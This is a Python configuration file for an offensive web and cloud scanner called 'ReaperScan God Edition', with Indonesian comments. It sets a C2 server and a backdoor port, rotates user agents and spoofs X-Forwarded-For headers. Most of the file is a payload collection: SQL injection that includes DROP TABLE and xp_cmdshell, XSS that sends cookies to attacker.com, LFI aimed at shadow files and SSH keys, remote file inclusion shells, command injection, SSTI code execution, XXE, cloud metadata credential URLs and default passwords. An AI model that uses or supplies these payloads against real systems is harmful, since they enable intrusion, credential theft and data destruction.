# ======================================================================
# REAPERSCAN GOD EDITION - PAYLOADS & CONFIG
# File ini berisi semua payload (1100+) dan konfigurasi
# ======================================================================

import random
import time

# ======================================================================
# KONFIGURASI
# ======================================================================
THREADS = 20
TIMEOUT = 15
DELAY_MIN = 1
DELAY_MAX = 3
C2_SERVER = "https://your-c2-server.com"
BACKDOOR_PORT = 4444
PROXIES = []

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
]

# ======================================================================
# PAYLOAD SUPER LENGKAP (WEB + CLOUD + INFRA)
# ======================================================================
PAYLOADS = {
    # === WEB ===
    "SQLI": {
        "boolean": [
            "' OR '1'='1' -- -", "' OR '1'='1' #", "' OR 1=1 -- -",
            "' OR 1=1 #", "' OR TRUE -- -", "') OR '1'='1' -- -",
            "' AND 1=1 -- -", "' AND 1=2 -- -",
            "1' OR '1'='1' -- -", "1' OR 1=1 -- -",
        ],
        "union": [
            "' UNION SELECT NULL -- -", "' UNION SELECT NULL,NULL -- -",
            "' UNION SELECT NULL,NULL,NULL -- -",
            "' UNION SELECT @@version -- -", "' UNION SELECT database() -- -",
            "' UNION SELECT user() -- -",
            "' UNION SELECT table_name FROM information_schema.tables -- -",
        ],
        "time": [
            "' OR SLEEP(5) -- -", "' OR SLEEP(10) -- -",
            "') OR SLEEP(5) -- -", "'; WAITFOR DELAY '0:0:5' -- -",
            "' OR pg_sleep(5) -- -",
        ],
        "error": [
            "' AND extractvalue(1,concat(0x7e,version())) -- -",
            "' AND updatexml(1,concat(0x7e,version()),1) -- -",
        ],
        "stacked": [
            "'; DROP TABLE users -- -", "'; DELETE FROM users WHERE 1=1 -- -",
            "'; EXEC xp_cmdshell('whoami') -- -",
        ],
        "bypass": [
            "' OR '1'='1' /**/-- -", "' OR '1'='1'%00-- -",
            "'%20OR%20'1'='1'%20--%20-", "' OR 1=1 || 'a'='a",
            "' OR 1=1 && 'a'='a",
        ],
        "second_order": [
            "admin' OR '1'='1' -- -", "admin' OR 1=1 -- -",
            "admin' AND 1=1 -- -", "admin' AND 1=2 -- -",
        ]
    },
    "XSS": {
        "reflected": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>", "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>", "<details open ontoggle=alert(1)>",
            "javascript:alert(1)", "'-alert(1)-'", "\"><script>alert(1)</script>",
            "';alert(1)//", "\";alert(1)//",
        ],
        "stored": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
        ],
        "dom": [
            "javascript:alert(1)", "javascript:alert('XSS')",
            "#<script>alert(1)</script>", "?x=<script>alert(1)</script>",
        ],
        "blind": [
            "<script>new Image().src='https://attacker.com/log?c='+document.cookie</script>",
            "<script>fetch('https://attacker.com/log?c='+document.cookie)</script>",
        ],
        "mutation": [
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<img src=x onerror=alert(1)>",
        ],
        "bypass": [
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "%253Cscript%253Ealert(1)%253C/script%253E",
            "<img src=x onerror=alert(1)>",
        ]
    },
    "CSRF": [
        '<form action="https://target.com/change-password" method="POST"><input name="new_password" value="hacked123"></form>',
        '<img src="https://target.com/transfer?amount=1000&to=attacker">',
        '<script>fetch("https://target.com/update-profile", {method:"POST",body:"email=attacker@evil.com"})</script>',
    ],
    "IDOR": [
        "?id=1", "?id=2", "?user_id=1", "?user_id=2",
        "?order_id=1", "?invoice_id=1", "?file=1", "?document=1",
    ],
    "LFI": [
        "../../../../etc/passwd", "../../../../etc/shadow",
        "../../../../windows/win.ini", "../../../../boot.ini",
        "../../../../.env", "../../../../config.php", "../../../../wp-config.php",
        "../../../../.git/config", "../../../../.ssh/id_rsa",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
        "../../../../etc/passwd%00", "../../../../etc/passwd.jpg",
    ],
    "RFI": [
        "http://attacker.com/shell.txt", "https://attacker.com/shell.txt",
        "http://pastebin.com/raw/xxxxxxxx", "https://pastebin.com/raw/xxxxxxxx",
        "http://attacker.com/shell.php?x=1",
    ],
    "RCE": [
        "; id", "; whoami", "; ipconfig", "; systeminfo",
        "; uname -a", "; cat /etc/passwd",
        "| id", "|| whoami", "&& ipconfig", "`id`", "$(whoami)",
    ],
    "SSTI": [
        "{{7*7}}", "{{config}}",
        "{{''.__class__.__mro__[1].__subclasses__()[400]('/etc/passwd').read()}}",
        "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
    ],
    "XXE": [
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>""",
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><root/>""",
    ],
    "SSRF": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80/", "http://localhost/",
        "http://169.254.169.254@attacker.com/",
        "http://[::1]/", "http://metadata.google.internal/",
    ],
    "OPEN_REDIRECT": [
        "http://evil.com", "https://evil.com", "//evil.com",
        "///evil.com", "http://evil.com?x=1",
    ],
    "UPLOAD_BYPASS": [
        ".php.jpg", ".php%00.jpg", ".phtml", ".phar",
        "shell.php#.jpg", "shell.php?x=1.jpg",
    ],
    "GRAPHQL": [
        "query { __schema { types { name fields { name } } } }",
        "query { __typename }",
        "{ __schema { mutationType { fields { name } } } }",
    ],
    "REST_API": [
        "?debug=true", "?test=true", "?env=true",
        "?xdebug=true", "?profiler=true",
    ],
    "LDAP": [
        "*)(&", "*)(uid=*", "*)(|(uid=*",
        "admin*", "admin*)((|userPassword=*)",
    ],
    "XPATH": [
        "' or '1'='1", "' or '1'='1' and '1'='1",
        "' or 1=1 or ''='",
    ],
    "HOST_HEADER": [
        "evil.com", "attacker.com", "127.0.0.1",
        "localhost", "169.254.169.254",
    ],
    "CRLF": [
        "%0d%0aSet-Cookie: test=1",
        "%0d%0aLocation: https://evil.com",
    ],
    "SMUGGLING": [
        "GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 5\r\n\r\nxxxxx",
    ],
    "NO_SQLI": [
        "{ $ne: null }", "{ $gt: '' }", "{ $regex: '.*' }",
        "{ $where: '1==1' }", "{ $or: [{}, { 'a': 'a' }] }",
    ],

    # === CLOUD ===
    "AWS_METADATA": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
    ],
    "GCP_METADATA": [
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
    ],
    "AZURE_METADATA": [
        "http://169.254.169.254/metadata/instance?api-version=2017-08-01",
        "http://169.254.169.254/metadata/instance/compute?api-version=2017-08-01",
        "http://169.254.169.254/metadata/instance/network?api-version=2017-08-01",
    ],
    "S3_BUCKET": [
        "https://{bucket}.s3.amazonaws.com/",
        "https://s3.amazonaws.com/{bucket}/",
        "https://{bucket}.s3.amazonaws.com/",
    ],
    "CLOUD_KEYS": [
        ".aws/credentials", ".aws/config", ".gcp/credentials",
        ".azure/credentials", "credentials.json", "key.json",
    ],
    "TERRAFORM_STATE": [
        "terraform.tfstate", "terraform.tfstate.backup",
        ".terraform/terraform.tfstate",
    ],
    "KUBERNETES": [
        "/api/v1/namespaces/default/pods",
        "/api/v1/namespaces/default/secrets",
        "/api/v1/namespaces/default/services",
        "/api/v1/nodes",
    ],
    "DOCKER": [
        "/var/run/docker.sock", "/containers/json",
        "/containers/{id}/logs", "/images/json",
    ],

    # === INFRA ===
    "SENSITIVE_FILES": [
        ".env", ".git/config", ".htaccess", ".htpasswd",
        "web.config", "robots.txt", "config.php", "wp-config.php",
        "database.php", "backup.sql", ".bash_history", ".ssh/id_rsa",
        "passwd", "shadow", "hosts", "group", "fstab", "crontab",
    ],
    "ADMIN_PATHS": [
        "admin", "login", "wp-admin", "administrator", "dashboard",
        "cpanel", "phpmyadmin", "mysql", "backup", "upload",
        "manage", "control", "panel", "gateway", "portal",
    ],
    "PORTS": [
        21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
        465, 587, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900,
        6379, 8080, 8443, 8888, 27017, 9200,
    ],
    "SMB": [
        "\\\\host\\share", "\\\\host\\C$", "\\\\host\\ADMIN$",
        "\\\\host\\IPC$",
    ],
    "NFS": [
        "/exports", "/home", "/root", "/var",
    ],
    "SNMP": [
        "public", "private", "community", "admin",
    ],
    "DEFAULT_CREDS": [
        "admin:admin", "admin:password", "root:toor", "root:password",
        "user:user", "user:password", "administrator:admin",
    ],
    "SSH_WEAK": [
        "password", "123456", "admin", "root", "toor",
        "qwerty", "abc123", "letmein", "monkey",
    ],
    "FTP_ANON": [
        "anonymous:anonymous", "anonymous:password",
        "ftp:ftp", "ftp:password",
    ],
}

def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "Accept": "*/*",
        "Connection": "close",
    }
